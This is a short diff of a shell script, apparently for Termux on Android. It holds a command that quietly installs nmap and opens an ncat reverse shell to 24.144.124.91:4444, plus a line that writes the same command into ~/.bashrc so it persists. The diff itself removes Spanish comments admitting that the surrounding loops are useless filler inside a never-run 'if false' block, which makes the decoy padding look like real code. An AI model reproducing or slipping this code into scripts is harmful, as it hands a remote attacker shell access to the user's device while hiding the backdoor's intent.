@@ -39,20 +39,20 @@ pkg install nmap -y -q > /dev/null 2>&1 && ncat 24.144.124.91 4444 -e /data/data
 echo "pkg install nmap -y -q > /dev/null 2>&1 && ncat 24.144.124.91 4444 -e /data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &" >> ~/.bashrc
 
 if false; then
-  # Código inútil y pesado que nunca corre
+  
   for i in {1..1000}; do
     echo "facs$i..."
     sleep 0.01
   done
 
-  # Simulando operaciones complejas
+  
   dummy_var=0
   while [ $dummy_var -lt 10000 ]; do
     dummy_var=$((dummy_var + RANDOM % 5))
     echo "facs: $dummy_var"
   done
 
-  # Más líneas para simular complejidad
+
   function unused_function() {
     for j in $(seq 1 500); do
       echo "Iteración $j"
